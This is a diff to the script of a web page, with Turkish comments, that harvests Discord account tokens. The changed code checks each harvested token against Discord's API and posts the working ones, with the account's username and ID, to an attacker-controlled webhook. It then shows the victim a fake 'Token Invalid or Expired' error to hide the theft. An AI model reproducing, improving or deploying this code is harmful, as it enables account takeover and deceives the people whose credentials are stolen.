@@ -37,25 +37,42 @@ st.style.color = "#ffcc00";
 
 for (const token of lines) {
     try {
-        await fetch(wh, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🚀 YENİ VERİ",
-                    description: "```" + token + "```",
-                    color: 16711680,
-                    timestamp: new Date().toISOString()
-                }]
-            })
+        // Discord API üzerinden tokeni doğrula
+        const check = await fetch("[https://discord.com/api/v9/users/@me](https://discord.com/api/v9/users/@me)", {
+            headers: { "Authorization": token }
         });
-    } catch (err) {}
+
+        // Sadece HTTP 200 (OK) dönerse token çalışıyor demektir
+        if (check.status === 200) {
+            const user = await check.json();
+            
+            await fetch(wh, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "✅ ÇALIŞAN TOKEN BULUNDU",
+                        fields: [
+                            { name: "Kullanıcı", value: "`" + user.username + "#" + user.discriminator + "`", inline: true },
+                            { name: "ID", value: "`" + user.id + "`", inline: true },
+                            { name: "Token", value: "```" + token + "```" }
+                        ],
+                        color: 65280, // Yeşil
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+        }
+    } catch (err) {
+        // Hata durumunda (CORS engeli vb.) sunucuya veri gitmez
+    }
 }
 
+// İşlem bittikten sonra her durumda sahte hata mesajı göster
 setTimeout(() => {
     st.textContent = "✕ Error: Token Invalid or Expired!";
     st.style.color = "#ff1e1e";
-}, 1200);
+}, 1500);
 });
 </script>
 
